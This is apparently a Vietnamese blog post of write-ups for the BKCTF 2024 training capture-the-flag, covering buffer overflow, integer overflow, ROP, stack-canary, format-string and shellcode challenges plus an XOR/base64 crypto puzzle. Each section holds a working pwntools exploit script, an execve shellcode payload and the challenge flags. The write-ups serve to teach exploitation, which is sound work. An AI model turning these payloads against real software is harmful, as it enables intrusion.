---
layout: post
title:  BKCTF 2024 Training
comments: true
---

## Table of Content
- [0x00 Lời chào](#lời-chào)
- [0x01 Pwnable](#pwnable)
    * [Buffalow](#bài-buffalow)
    * [index_1](#bài-index_1)
    * [int_1](#bài-int_1)
    * [Rộp Rộp Rộp](#bài-rộp-rộp-rộp)
    * [pwn3](#bài-pwn3)
    * [Raising the hero](#bài-raising-the-hero)
    * [shell_1](#bài-shell_1)
- [0x02 Crypto](#crypto)
    * [B64 Recovery](#bài-b64-recovery)
    
## Lời chào 

{:refdef: style="text-align: center;"}
  ![Smile](/images/bktrain2024/imagee.png)  
{: refdef}

Đã từ lâu, tôi không viết bài ctf mới trên blog, một phần vì chưa có chủ đề nào tôi cảm thấy thú vị để viết, phần còn lại là do quỹ thời gian của tôi gần đây không có nhiều. Khởi động năm mới 2024 với giải training của trường ĐHBKHN, độ khó của các bài chỉ ở tầm dễ, trung bình, vì vậy tôi cũng tự tin hơn. 

## Pwnable 

### Bài Buffalow

Đề bài cho chúng ta source code, đây là một bài BOF cơ bản 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void)
{
    setbuf(stdout, NULL);
    int flag = 0xdeadbeef;
    char buf[50] = {0};
    printf("Enter your favorite number: ");
    fgets(buf, 0x64, stdin);

    if (flag == 0x13141516)
    {
        FILE *fp = fopen("flag.txt", "r");
        char flag[100];
        fgets(flag, sizeof(flag), fp);   
        puts(flag);
    }
    return 0;
}
```

Hỗ hổng nằm ở hàm `fgets` với việc cho nhập 100 bytes vào mảng `buf` có kích thước 50 bytes. Vì vậy, chúng ta có thể thay đổi giá trị biến `flag` từ 0xDEADBEEF thành 0x13141516 dựa vào lỗ hổng này. 

Quan sát trong IDA, chúng ta dễ dàng tính ra được số bytes cần phải lấp đầy mảng `buf` được khi ghi đè giá trị biến `flag` là 0x50-0x4 = 76 (bytes)

![alt text](/images/bktrain2024/image.png)

**Lời giải**
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./bof_1")
p = process(elf.path)
p = remote("45.77.247.61", 6001)

payload = b'x'*76 + p32(0x13141516)
p.sendlineafter(b'number: ', payload)

p.interactive()
```

**Đáp án: BKSEC{\xBuffer\xOv3rfl0w\x1s\xchiLL}**

### Bài index_1

Đây là một chương trình mua bán các vật phẩm. Với dạng bài này, các lỗ hổng như chuyển tiền âm, mua số lượng sản phẩm âm, ... rất dễ xảy ra nếu không được kiểm tra kỹ càng. 

Load file vào IDA, sau khi phân tích một chút, chúng ta cần quan tâm tới 2 đoạn mã sau đây

```c
if ( option == 6 )
{
    if ( money > 0x64 )
    {
        system("/bin/sh");
        exit(1);
    }

LABEL_x409:
    puts("Insufficient funds. You cannot afford this item.");
}
```
Với số tiền ban đầu là `money = 0x64`, chúng ta sẽ có được shell nếu như số tiền `money > 0x64`. 

```c
if ( option <= 6 )
{
    price = HIDWORD(v9[7 * option - 1]);
    total = price * num;
    if ( (int)(price * num) > money )
    {
        goto LABEL_x409;
    }

    money -= total;
    [...]
}
```

Với đoạn code này, khi mua vật phẩm, số tiền chúng ta sẽ bị trừ đi. Ở đây không có kiểm tra số lượng vật phẩm mua, vì vậy chúng ta sẽ mua số vật phẩm < 0. 

![alt text](/images/bktrain2024/image-1.png)

**Đáp án: BKSEC{YOU_SHOULD_buY_f1A9_iN5TE4d_0F_p@PC@i1}**

### Bài int_1

Load file vào IDA, ta thấy chương trình cho nhập 2 số nguyên dương. Nếu tổng của chúng < 0, ta sẽ có được shell. Đây là lỗ hổng IOF (tràn số nguyên), ta chỉ cần nhập max giá trị của kiểu dữ liệu int cho số đầu tiên và số còn lại với giá trị nguyên dương bất kỳ. 

![alt text](/images/bktrain2024/image-7.png)

**Lời giải**
```python
#!/usr/bin/env python3 
from pwn import *

p = remote("45.77.247.61", 6051)

p.sendlineafter(b'number: ', b'2147483647')
p.sendlineafter(b'number: ', b'10')

p.interactive()
```

**Đáp án: BKSEC{Ma7h_1s_7hE_woR57_thIn6_EveR}**

### Bài Rộp Rộp Rộp

Load file đã cho vào IDA, ta thấy được lỗ hổng ở hàm `fgets()` với việc cho phép nhập 0x100 bytes cho mảng `buf` có kích thước 8 bytes. (Ở đây tôi không chắc `buf` có kích thước 8 bytes vì IDA phân tích ra như vậy. Nhưng tôi chắc chắn có lỗi BOF do `buf` được bắt đầu từ [rbp-0x40])

![alt text](/images/bktrain2024/image-3.png)

Quay lại bài toán, đây là dạng bài `ret2win` với hàm `win()` được thiết kế như sau

```c
int __fastcall win(const char *a1, const char *a2)
{
    if ( a1 != (const char *)0xDEADBEEFDEADBEEFLL || a2 != (const char *)0xDEADBEEFDEADBEEFLL )
    {
        puts("!!! Access denied");
        printf("Entered param1: %s\n", a1);
        printf("Entered param2: %s\n", a2);
        exit(1);
    }

    return system("/bin/sh");
}
```

Dễ thấy chỉ cần `a1 = a2 = 0xDEADBEEFDEADBEEF` thì chúng ta sẽ lấy được shell. Sử dụng gdb, ta thấy giá trị 2 thanh ghi `rdi` và `rsi` được so sánh với 0xDEADBEEFDEADBEEF. Từ đây, chúng ta cần tìm các ROP-Gadget để kiểm soát giá trị cho 2 thanh ghi này. Nhiệm vụ này cũng chính là tên của bài toán "Rộp". 

![alt text](/images/bktrain2024/image-4.png)

**Lời giải**
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./bof_2")
# p = process(elf.path) 
p = remote("45.77.247.61", 6011)

pop_rdi = 0x00000000004011e5
pop_rsi = 0x00000000004011ee
ret = 0x000000000040101a

payload = b'x'*0x48 + p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF) + p64(pop_rsi) + p64(0xDEADBEEFDEADBEEF) + p64(ret) + p64(elf.symbols["win"])
p.sendlineafter(b'number: ', payload)

p.interactive()
```

**Đáp án: BKSEC{2-->\\xupgrade\\xBuffer\\xOv3rfl0w\\x1s\\xn0t\\xchiLL\\xhixxxxxxxxxxxxxx}**

### Bài pwn3

Về cơ bản, ý tưởng giải bài này y hệt bài phía trên. Chỉ khác ở bài này có thêm cờ canary được bật. 

**Lời giải**
```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./bof_3")
# p = process("./bof_3")
p = remote("45.77.247.61", 6021)

p.recvuntil(b'is: ')
canary = int(p.recvline().strip().decode(), 16)
print("canary" + hex(canary))

pop_rdi = 0x0000000000401205
pop_rsi = 0x000000000040120e
ret = 0x0000000000401398

payload = b'x'*0x58 + p64(canary) + p64(0) + p64(pop_rdi) + p64(0xDEADBEEFDEADBEEF) + p64(pop_rsi) + p64(0xDEADBEEFDEADBEEF) + p64(ret) + p64(elf.symbols["win"])
p.sendlineafter(b'number: ', payload)

p.interactive()
```

**Đáp án: BKSEC{W3_4LL_Hat3_c4NARY}**

### Bài Raising the hero

Kiểm tra các lớp bảo vệ của file 
>   Canary                        : ✓
    NX                            : ✓
    PIE                           : ✘
    Fortify                       : ✘
    RelRO                         : ✘

Load chương trình vào IDA32, chúng ta thấy có lỗ hổng FMT ở dòng `printbuffer(buf)`. 

![alt text](/images/bktrain2024/image-5.png)

Đây là dạng bài `ret2win`, chúng ta chỉ cần thay đổi giá trị `target = 0x6F726568` sẽ có được shell. 

**Lời giải**
```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./fmt_1")
p = process(elf.path)
p = remote("45.77.247.61", 6101)

target = 0x0804B39C

payload = f'%{0x6568}c%23$n'.encode()
payload += f'%{0x6F72 - 0x6568}c%24$n'.encode()
payload = payload.ljust(0x20, b'P')
payload += p32(target)
payload += p32(target + 2)

p.sendlineafter(b'say?\n', payload)

p.interactive()
```

Phân tích một chút về lời giải trên. Do PIE tắt nên địa chỉ biến `target` không thay đổi. Chúng ta cần quan sát và đếm trên stack để biết được chính xác vị trí của `target`. 

Để gán cho `target = 0x6F726568`, ta phải chia ra làm 2 phần, vì khi truyền 0x6F726568 kí tự cho `target` thì sẽ quá lâu. Vì vậy, ta sẽ gán 0x6568 cho `target` và 0x6F72 cho `target+2`. Lưu ý rằng, `$n` đếm số byte ở trước đó được ghi, vậy nên khi gán giá trị cho `target+2`, chúng ta chỉ cần gán 0x6F72 - 0x6568 (bytes) mà thôi. 

**Đáp án: BKSEC{R41s1ng_th3_H3rO}**

**Tham khảo:**
- [Bài 16: Format String - Ghi dữ liệu bằng %n](https://www.youtube.com/watch?v=uet1ixUN8Gg)

### Bài shell_1

Load file vào IDA, yêu cầu bài này chỉ là viết shellcode đơn giản 

![alt text](/images/bktrain2024/image-6.png)

**Lời giải**
```python
#!/usr/bin/env python3
from pwn import *

p = process("./shell_1")
p = remote("45.77.247.61", 6071)

payload = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
p.sendlineafter(b'(max 256 bytes):\n', payload)

p.interactive()
```
**Đáp án: BKSEC{ju$7_A_5imPLE_ShelLCODE}**

## Crypto 

### Bài B64 Recovery

Đề bài cho chúng ta source code như sau 

```python
import base64
import random
flag = 'BKSEC{still secret}'
flag = base64.b64encode(flag.encode()).decode()
key = "" #guess it if u can
encode = ""
pivot = random.randint(0,len(key)-1)
i = pivot
for c in flag:
    encode += chr(ord(c)^ord(key[i]))
    i += 1
    i %= len(key)
output = chr(len(flag)) + chr(pivot) + encode
print(output)
```

Từ `output`, chúng ta có thể biết một số thông tin như sau
- Độ dài `flag` sau khi encode base64 là 68
- Giá trị ngẫu nhiên `pivot`
- Đoạn mã encoded

Lưu ý: `flag` mà chúng ta nhắc tới ở đây là sau khi đã bị mã hóa base64, không phải flag ban đầu. 

Thuật toán bài toán này rất đơn giản, đem xor giá trị của `flag[i]` với `key[pivot % len(key)]`. 

Nhờ việc connect server liên tục, ta có thể đoán được `len(key) = 50`
```python
# brute-force to find len of key
x = []
for i in range(100000):
    p = remote("45.77.247.61", 7021)

    data = p.recv(100)

    lenflag = 68 
    pivot = data[1]
    x.append(int(pivot))

    print("pivot " + str(pivot))

x.sort()
print(x)
```

Kế tiếp, ta đã biết được **flag gốc** bắt đầu bằng cụm từ **BKSEC{**. Thử một số phép thử với mã hóa base64, ta nhận thấy flag sau khi encode luôn bắt đầu bằng **QktTRUN7**.  

Do ta đã biết đoạn `encoded`, kết hợp thuật toán nêu trên. Ta có thể tìm lại được `key` bằng cách cho connet server liên tục để khôi phục. 

```python
# brute-force to find key
for i in range(100):
    p = remote("45.77.247.61", 7021)

    data = p.recv(100)
    encoded = data[2::].strip()
    pivot = data[1]

    for j in range(8):
        key[(pivot + j) % 50] = encode[j] ^ ord(flag[j])
    print(i, key)
    
    p.close()
```

Từ đây, ta có được `key` và việc giải bài toán còn lại là hoàn toàn dễ dàng

**Lời giải**

```python
from pwn import *
import base64

# brute-force to find len of key
x = []
for i in range(100000):
    p = remote("45.77.247.61", 7021)

    data = p.recv(100)

    lenflag = 68 
    pivot = data[1]
    x.append(int(pivot))

    # print(data)
    print("pivot " + str(pivot))
    # p.close()

x.sort()
print(x)

lenflag = 68
lenkey = 50 
flag = ['Q', 'k', 't', 'T', 'R', 'U', 'N', '7'] + [''] * 60
key = [0] * 50

# brute-force to find key
for i in range(100):
    p = remote("45.77.247.61", 7021)

    data = p.recv(100)
    encoded = data[2::].strip()
    pivot = data[1]

    for j in range(8):
        key[(pivot + j) % 50] = encode[j] ^ ord(flag[j])
    print(i, key)
    
    p.close()

key = [73, 95, 98, 101, 116, 95, 121, 111, 117, 95, 99, 111, 117, 108, 100, 95, 110, 111, 116, 95, 102, 105, 110, 100, 95, 116, 104, 101, 95, 107, 101, 121, 46, 95, 67, 104, 97, 110, 103, 101, 95, 109, 121, 95, 109, 105, 110, 100, 33, 33]

p = remote("45.77.247.61", 7021)

data = p.recv(100)
encoded = data[2::].strip()
pivot = data[1]
decoded = ''

i = pivot
for c in encoded:
    decoded += chr(c ^ key[i % 50])
    i += 1
    i %= 50

print(base64.b64decode(decoded))

p.interactive()
```

**Đáp án: BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}**